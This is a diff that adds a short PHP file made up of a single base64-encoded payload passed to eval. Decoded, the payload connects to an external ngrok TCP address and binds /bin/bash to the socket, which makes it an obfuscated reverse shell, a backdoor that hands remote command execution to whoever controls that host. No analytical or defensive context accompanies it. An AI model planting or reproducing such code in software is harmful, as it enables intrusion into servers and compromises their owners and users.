@@ -1,0 +1,3 @@
+<?php
+eval(base64_decode('JGlwID0gJzAudGNwLmFwLm5ncm9rLmlvJzsKJHBvcnQgPSAxMTg4NjsKJHNvY2sgPSBmc29ja29wZW4oJGlwLCAkcG9ydCk7CiRwcm9jID0gcHJvY19vcGVuKCcvYmluL2Jhc2gnLCBbCjAgPT4gJHNvY2ssCjEgPT4gJHNvY2ssCjIgPT4gJHNvY2tdLCAkcGlwZXMpOw=='));
+?>
